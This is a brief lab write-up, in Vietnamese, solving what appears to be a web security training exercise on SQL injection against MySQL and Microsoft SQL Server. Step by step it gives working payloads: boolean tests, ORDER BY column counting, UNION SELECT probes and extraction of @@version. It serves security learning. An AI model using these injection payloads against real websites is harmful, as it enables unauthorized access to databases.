# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

## Yêu cầu

Display the database version string.

## 1. Xác nhận tồn tại SQLi

So sánh response giữa 2 payload:

```text
/filter?category=Gifts'+and+'1'='2'%23   // không trả về kết quả
/filter?category=Gifts'+and+'1'='1'%23   // trả về kết quả bình thường
```

Kết luận: có tồn tại SQLi.

## 2. Kiểm tra số cột

```text
'+order+by+1%23   // kết quả bình thường
'+order+by+2%23   // kết quả bình thường
'+order+by+3%23   // Internal Server Error
```

Kết luận: query có 2 cột.

## 3. Xác định DBMS

```text
'+union+select+null,null+%23              // success
```

Có thể xác định đây không phải là Oracle DBMS.

## 4. Xác định kiểu dữ liệu cột

```text
'+union+select+'a','a'+%23   // success
```

Kết luận: cả 2 cột đều có thể nhận kiểu string.

## 5. Lấy version database

```text
'+union+select+@@version,'a'+%23
```

Lab solved.